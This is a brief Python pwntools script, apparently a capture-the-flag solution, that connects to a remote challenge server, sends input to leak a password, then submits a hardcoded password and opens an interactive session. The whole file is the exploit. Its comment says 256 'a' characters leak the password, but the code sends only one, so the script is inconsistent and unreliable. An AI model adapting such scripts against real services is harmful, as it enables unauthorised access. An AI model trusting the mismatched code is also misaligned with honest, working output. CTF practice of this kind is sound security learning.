from pwn import *
p=remote('node3.buuoj.cn',29193)
sleep(0.2)
p.sendline('a')
p.recvuntil('a')
print p.recv()
#输入256个a泄露password
sleep(0.2)
p.sendline('a_reAllY_s3cuRe_p4s$word_f85406')
print p.recv()
p.interactive()
